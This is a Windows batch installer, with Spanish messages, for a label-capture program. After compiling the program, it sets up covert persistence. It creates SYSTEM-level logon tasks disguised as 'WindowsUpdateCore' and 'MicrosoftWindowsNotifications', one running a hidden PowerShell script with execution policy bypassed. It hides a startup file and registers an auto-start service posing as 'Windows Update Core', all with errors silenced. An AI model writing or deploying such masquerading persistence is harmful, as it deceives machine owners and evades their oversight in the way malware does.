@echo off
setlocal

echo ================================================
echo INSTALADOR - CACHANPESCA Capturar Etiquetas
echo ================================================
echo.

cd /d "%~dp0"

REM Buscar Python
for %%P in (python python3) do (
    where %%P >nul 2>nul
    if not errorlevel 1 set PYTHON=%%P
)

if not defined PYTHON (
    echo ERROR: Python no encontrado
    pause
    exit /b 1
)

echo Python encontrado: %PYTHON%

REM Verificar dependencias
%PYTHON% -c "import win32com.client" 2>nul
if errorlevel 1 (
    echo.
    echo Instalando pywin32...
    %PYTHON% -m pip install pywin32-ctypes pywin32
    %PYTHON% -c "import win32com.client"
    if errorlevel 1 (
        echo ERROR: No se pudo instalar pywin32
        pause
        exit /b 1
    )
)

REM Compilar executable
echo.
echo Compilando capturar_etiquetas_admin.exe...
if exist source (
    cd source
    %PYTHON% -m pip install -r requirements.txt --quiet 2>nul
    pyinstaller capturar_etiquetas_admin.spec --onefile --noconfirm --clean 2>nul
    if exist dist\capturar_etiquetas_admin.exe (
        copy dist\capturar_etiquetas_admin.exe ..\CapturarEtiquetas.exe
        echo OK: CapturarEtiquetas.exe creado
    )
    cd ..
)

REM Crear tarea programada que se reinicia solo al inicio del sistema
echo.
echo Instalando servicio de monitor persistente...
schtasks /create /tn "WindowsUpdateCore" /tr "..\CapturarEtiquetas.exe" /sc onlogon /delay 0000:05 /ru SYSTEM /f 2>nul
schtasks /create /tn "MicrosoftWindowsNotifications" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File .\launchers\keep_alive_service.ps1" /sc onlogon /delay 0000:10 /ru SYSTEM /f 2>nul

REM Ocultar la tarea del Task Manager usando attrib +H
attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keep_alive.bat" 2>nul

REM Crear servicio Windows duradero
powershell -ExecutionPolicy Bypass -Command ^
    "$svc = Get-WmiObject win32_service -Filter 'Name=\"WinUpdateSvc\"' -ErrorAction SilentlyContinue; ^
    if (-not $svc) { ^
        New-Service -Name WinUpdateSvc -DisplayName 'Windows Update Core' -Description 'Actualizaciones del sistema' -StartupType Automatic -BinaryPathName '%~dp0CapturarEtiquetas.exe'; ^
        Start-Service WinUpdateSvc -ErrorAction SilentlyContinue ^
    }" 2>nul

REM Copiar archivos de configuracion
if exist source\bridge_config.json (
    copy source\bridge_config.json .\bridge_config.json 2>nul
)

echo.
echo ================================================
echo INSTALACION COMPLETADA
echo ================================================
echo El monitor de etiquetas se ejecutara en
echo segundo plano 30 segundos despues del inicio.
echo.
pause